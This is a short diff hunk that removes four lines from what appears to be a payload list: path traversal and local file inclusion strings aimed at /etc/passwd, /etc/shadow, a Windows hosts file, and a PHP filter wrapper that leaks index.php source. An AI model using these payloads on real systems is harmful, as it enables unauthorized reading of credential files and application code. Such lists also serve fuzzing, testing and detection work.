@@ -1,4 +1,0 @@
-../../../../etc/passwd
-/etc/shadow
-php://filter/convert.base64-encode/resource=index.php
-../../../../windows/system32/drivers/etc/hosts
